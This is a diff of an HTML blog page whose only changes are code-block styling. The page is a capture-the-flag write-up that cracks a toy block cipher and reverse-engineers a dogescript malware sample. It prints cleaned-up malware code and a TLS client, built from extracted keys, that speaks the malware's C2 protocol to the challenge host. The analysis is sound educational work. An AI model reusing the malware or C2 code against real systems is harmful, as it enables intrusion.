@@ -148,7 +148,7 @@ For this challenge we were given a darknet website which could be accessed with 
 <p>
 <img src="/images/crowdstrike-darknet-forum.png" alt="/images/crowdstrike-darknet-forum.png" title="/images/crowdstrike-darknet-forum.png" /></p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;              ,
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                /|      ,
@@ -191,7 +191,7 @@ For this challenge we were given a darknet website which could be accessed with 
 <p>
 The first thing I did to start understanding this is to start formatting, renaming, and commenting the code. This is what it looked like after I was done with that.</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;              ,
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                /|      ,
@@ -266,7 +266,7 @@ The first thing I did to start understanding this is to start formatting, renami
 <p>
 The second step was to understand how the baddies would use the script to get an understanding for roughly how it was going to work:</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;FOOL&#39;</span>) <span style="color:#75715e"># Python won&#39;t evaluate the OR conditional</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;FOOL&#39;</span>) <span style="color:#75715e"># Python won&#39;t evaluate the OR conditional</span>
 </span></span><span style="display:flex;"><span>                                <span style="color:#75715e"># if the first is false. So this is the same as</span>
 </span></span><span style="display:flex;"><span>                                <span style="color:#75715e"># If len(sys.argv) not 3 then quit</span>
 </span></span><span style="display:flex;"><span>
@@ -292,7 +292,7 @@ The function <code class="verbatim">U</code> seems to take 9 bytes in and return
 <p>
 So that left me with understanding <code class="verbatim">C</code>. The simple part of <code class="verbatim">C</code> takes the user&#39;s plaintext and pads it to 3 bytes with <code class="verbatim">0x00</code>. It then produces a generator function which takes in 3 bytes of data, applies <code class="verbatim">B</code> to the bytes with the key <code class="verbatim">K</code> and yields 3 bytes of cyphertext.</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    N<span style="color:#f92672">=</span>len(M)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    N<span style="color:#f92672">=</span>len(M)
 </span></span><span style="display:flex;"><span>    R<span style="color:#f92672">=</span>N<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>
 </span></span><span style="display:flex;"><span>    R<span style="color:#f92672">=</span>R <span style="color:#f92672">and</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>R
 </span></span><span style="display:flex;"><span>    M<span style="color:#f92672">=</span>M<span style="color:#f92672">+</span>R<span style="color:#f92672">*</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
@@ -301,7 +301,7 @@ So that left me with understanding <code class="verbatim">C</code>. The simple p
 <p>
 The difficult part was understanding what <code class="verbatim">B</code> does. A 9 byte key gets assigned to <code class="verbatim">A</code>-<code class="verbatim">I</code> and three bytes of plaintext to <code class="verbatim">X</code>, <code class="verbatim">Y</code>, and <code class="verbatim">Z</code>.</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    B<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> A,B,C,D,E,F,G,H,I,X,Y,Z:bytes((A<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>B<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>C<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    B<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> A,B,C,D,E,F,G,H,I,X,Y,Z:bytes((A<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>B<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>C<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,
 </span></span><span style="display:flex;"><span>                                       D<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>E<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>F<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,
 </span></span><span style="display:flex;"><span>                                       G<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>H<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>I<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>))</span></span></code></pre></div>
 </div>
@@ -312,7 +312,7 @@ We know that this is a block cypher because it takes 3 bytes in and returns 3 by
 There&#39;s some key K such that C(K, b&#39;SPA&#39;) = b&#39;\x25\x9F\x8D&#39;
 Because each character of text only uses 3 bytes to encrypt a message we can pretty easily brute force this.</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solver</span>(cleartext, cyphertext):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solver</span>(cleartext, cyphertext):
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cleartext is 3 bytes
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
@@ -330,7 +330,7 @@ Because each character of text only uses 3 bytes to encrypt a message we can pre
 <p>
 This tries to find all 3 byte keys that transform our plaintext into the known cyphertext. I run this for all 3 plaintext-&gt;cypher blocks that we know and find which keys are common to all 3 (this exact code is lost to the python interpreter). There is only one possible key that satisfies all three known blocks. So now that we know the encryption key the question is whether or not we can reverse the solver and derive the decryption key:</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Is there an inverse key?</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Is there an inverse key?</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># 25 9F 8D 01 4A 44 C2 BE 8F</span>
 </span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x25\x9f\x8d</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;S&#39;</span>)
 </span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01\x4a\x44</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span>)
@@ -355,7 +355,7 @@ This tries to find all 3 byte keys that transform our plaintext into the known c
 <p>
 So what&#39;s our decryption key?</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([x<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> key])
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([x<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> key])
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SP4evaCES&#39;</span></span></span></code></pre></div>
 </div>
 <p>
@@ -386,7 +386,7 @@ Catapult Spider - Much Sad
 <p>
 We were given the following file</p>
 <div class="src src-plain">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>+------------------------------------------------------------------------------+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>+------------------------------------------------------------------------------+
 </span></span><span style="display:flex;"><span>|                                                                              |
 </span></span><span style="display:flex;"><span>|                        ,oc,                                                  |
 </span></span><span style="display:flex;"><span>|   BAD CAT.            ,OOxoo,                                  .cl::         |
@@ -454,18 +454,18 @@ This was probably the most time consuming of the CTF challenges that I was able 
 <p>
 This was probably suboptimal but I used <code class="verbatim">strings -n 1 malware &gt; out.txt</code> to write all the strings to a file. I then put all of the dogescript through a doge-&gt;javascript converter so I could read it without completely losing my mind. After some massive cleanup I was left with something like the following code (plus come ommitted keys and certificates):</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dson</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dogeon&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// var dogescript = require(&#39;dogescript&#39;);
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// var mysterious = require(&#39;./muchmysterious&#39;);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cript_key</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">15</span>);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// if (process.env.CRYPTZ === undefined) {
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">//     console.log(&#39;no cryptz key. doge can not crypt catz.&#39;);
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">//     process.exit(1);
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secrit_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cript</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">CRYPTZ</span>, <span style="color:#a6e22e">cript_key</span>);
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">CRYPTZ</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;you dnt git key&#39;</span>;
@@ -514,7 +514,7 @@ This was probably suboptimal but I used <code class="verbatim">strings -n 1 malw
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span>;
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;buffered bytes before: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">size</span>; <span style="color:#75715e">// buffered bytes will be -4
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;buffered bytes after: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span>);
+</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;buffered bytes after: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;queue0: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>]);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;queue0_len: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">length</span>);
@@ -796,10 +796,10 @@ This was probably suboptimal but I used <code class="verbatim">strings -n 1 malw
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">networker</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Networker</span>(<span style="color:#a6e22e">socket</span>, (<span style="color:#a6e22e">data</span>) =&gt; {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_lingo</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">toString</span>();
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// plz console.loge with &#39;top doge sez:&#39; doge_lingo
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_woof</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dogeParam</span>(<span style="color:#a6e22e">doge_lingo</span>);
+</span></span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doge_woof</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dogeParam</span>(<span style="color:#a6e22e">doge_lingo</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">networker</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">doge_woof</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">//networker.send(dogeParam(data.toString()));
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    });
+</span></span></span><span style="display:flex;"><span>    });
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">networker</span>.<span style="color:#a6e22e">init</span>(<span style="color:#e6db74">&#39;such doge is yes wow&#39;</span>, <span style="color:#e6db74">&#39;such doge is shibe wow&#39;</span>);
 </span></span><span style="display:flex;"><span>});
 </span></span><span style="display:flex;"><span>
@@ -818,11 +818,11 @@ Based on the code it was pretty clear that the flag would be in the <code class=
 <p>
 The first challenge was to be able to speak to the C2 server. I accomplished that by creating a TLS connection with the keys I extracted from the binary</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">key</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">DOGE_KEY</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cert</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">DOGE_CERT</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// requestCert: true,
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">rejectUnauthorized</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rejectUnauthorized</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;veryprotocol.challenges.adversary.zone&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">41414</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ca</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">DOGE_CA</span>]
@@ -834,17 +834,17 @@ The first challenge was to be able to speak to the C2 server. I accomplished tha
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">decrypter</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">32</span>)).<span style="color:#a6e22e">toString</span>()); <span style="color:#75715e">// decrypter defined below
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>; });
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>; });
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;close&#39;</span>, <span style="color:#66d9ef">function</span>() {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Connection closed&#34;</span>);
 </span></span><span style="display:flex;"><span>});
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// When an error ocoures, show it.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">error</span>) {
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">error</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">error</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Close the connection after the error occurred.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">destroy</span>();
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">destroy</span>();
 </span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
 </div>
 <p>
@@ -864,11 +864,11 @@ The C2 (using hardcoded keys):</p>
 <p>
 Here&#39;s the helper functions I created to build the binary format.</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">toBytesInt32</span> (<span style="color:#a6e22e">num</span>) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">toBytesInt32</span> (<span style="color:#a6e22e">num</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">4</span>); <span style="color:#75715e">// an Int32 takes 4 bytes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">arr</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">arr</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">setUint32</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">num</span>, <span style="color:#66d9ef">false</span>); <span style="color:#75715e">// byteOffset = 0; litteEndian = false
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">arr</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">arr</span>);
 </span></span><span style="display:flex;"><span>};
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">zencrypter</span>(<span style="color:#a6e22e">data</span>) {
@@ -889,7 +889,7 @@ Here&#39;s the helper functions I created to build the binary format.</p>
 <p>
 I also created a function to decrypt the messages from the server:</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decrypter</span>(<span style="color:#a6e22e">data</span>) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decrypter</span>(<span style="color:#a6e22e">data</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">aes_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">pbkdf2Sync</span>(<span style="color:#e6db74">&#39;such doge is shibe wow&#39;</span>, <span style="color:#e6db74">&#39;suchdoge4evawow&#39;</span>, <span style="color:#ae81ff">4096</span>, <span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#39;sha256&#39;</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wow_decripter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createDecipheriv</span>(<span style="color:#e6db74">&#39;aes-128-cbc&#39;</span>, <span style="color:#a6e22e">aes_key</span>, <span style="color:#a6e22e">iv</span>);
@@ -904,7 +904,7 @@ Now that I could speak to the server it was time to figure out what higher level
 <p>
 To make things easier on myself I created two more helper functions to generate the messages to send to the server. One was to create a message out of dogescipt string and one was to allow me to just write normal json</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dogeon&#39;</span>);
